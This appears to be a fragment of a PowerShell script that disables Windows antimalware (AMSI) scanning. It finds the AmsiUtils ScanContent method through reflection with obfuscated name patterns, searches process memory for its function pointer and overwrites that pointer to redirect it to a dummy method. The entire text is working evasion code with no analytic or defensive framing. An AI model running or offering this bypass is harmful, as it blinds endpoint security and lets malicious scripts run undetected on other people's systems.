$ObfAssemblies = [appdomain]::currentdomain.getassemblies()
$ObfAssemblies |
    ForEach-Object {
        if ($_.Location -ne $null) {
            $ObfSplit1 = $_.FullName.Split(",")[0]
            If ($ObfSplit1.StartsWith('S') -And $ObfSplit1.EndsWith('n') -And $ObfSplit1.Length -eq 28) {
                $ObfTypes = $_.GetTypes()
            }
        }
    }

$ObfTypes |
    ForEach-Object {
        if ($_.Name -ne $null) {
            If ($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
                $ObfMethods = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
            }
        }
    }

$ObfMethods |
    ForEach-Object {
        if ($_.Name -ne $null) {
            If ($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
                $ObfMethodFound = $_
            }
        }
    }

[IntPtr] $ObfMethodPointer = $ObfMethodFound.MethodHandle.GetFunctionPointer()
[IntPtr] $ObfHandle = [APIs]::GetCurrentProcess()
$ObfDummy = 0
$ObfApiReturn = $false

:initialloop for ($j = $InitialStart; $j -lt $MaxOffset; $j += $NegativeOffset) {
    [IntPtr] $ObfMethodPointerToSearch = [Int64] $ObfMethodPointer - $j
    $ObfReadedMemoryArray = [byte[]]::new($ReadBytes)
    $ObfApiReturn = [APIs]::ReadProcessMemory($ObfHandle, $ObfMethodPointerToSearch, $ObfReadedMemoryArray, $ReadBytes, [ref]$ObfDummy)
    for ($i = 0; $i -lt $ObfReadedMemoryArray.Length; $i += 1) {
        $ObfBytes = [byte[]]($ObfReadedMemoryArray[$i], $ObfReadedMemoryArray[$i + 1], $ObfReadedMemoryArray[$i + 2], $ObfReadedMemoryArray[$i + 3], $ObfReadedMemoryArray[$i + 4], $ObfReadedMemoryArray[$i + 5], $ObfReadedMemoryArray[$i + 6], $ObfReadedMemoryArray[$i + 7])
        [IntPtr] $ObfPointerToCompare = [bitconverter]::ToInt64($ObfBytes, 0)
        if ($ObfPointerToCompare -eq $ObfFuncAddr) {
            Write-Host "Found @ $($j) : $($i)!"
            [IntPtr] $ObfMemoryToPatch = [Int64] $ObfMethodPointerToSearch + $i
            break initialloop
        }
    }
}
[IntPtr] $ObfDummyPointer = [APIs].GetMethod('Dummy').MethodHandle.GetFunctionPointer()
$ObfBuf = [IntPtr[]] ($ObfDummyPointer)
[System.Runtime.InteropServices.Marshal]::Copy($ObfBuf, 0, $ObfMemoryToPatch, 1)

$ObfFinishDate = Get-Date;
$ObfTimeElapsed = ($ObfFinishDate - $ObfInitialDate).TotalSeconds;
Write-Host "$ObfTimeElapsed seconds"
}
